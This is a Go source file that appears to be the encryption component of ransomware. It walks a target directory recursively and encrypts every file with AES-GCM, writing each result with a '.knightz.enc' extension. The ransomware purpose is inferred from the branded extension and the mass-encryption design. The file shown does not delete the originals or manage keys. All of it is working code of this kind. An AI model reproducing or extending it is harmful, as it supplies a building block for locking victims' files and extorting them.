// <PROJECT DIR>/subprocess/ciphers/encryption.go
package ciphers

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
)

// Encrypt the given file (specified by filename) in AES using the given key
func encryptFileAES(filepath string, key []byte) error {
	plaintext, err := os.ReadFile(filepath)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
		return err
	}

	aesBlock, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating AES block: %v", err)
		return err
	}

	aesGCM, err := cipher.NewGCM(aesBlock)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
		return err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatalf("Error generating nonce: %v", err)
		return err
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	encryptedFilepath := filepath + ".knightz.enc"
	os.WriteFile(encryptedFilepath, ciphertext, 0644)
	return nil
}

// EncryptDirectory walks through the directory and encrypts each file
func EncryptDirectory(targetDirectory string, key []byte) error {
	err := filepath.Walk(targetDirectory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			fmt.Printf("Encrypting file: %s\n", path)
			err = encryptFileAES(path, key)
			if err != nil {
				log.Fatalf("Error encrypting file: %v", err)
				return err
			}
			fmt.Printf("Encrypted file: %s\n", path)
		}
		return nil
	})

	return err
}
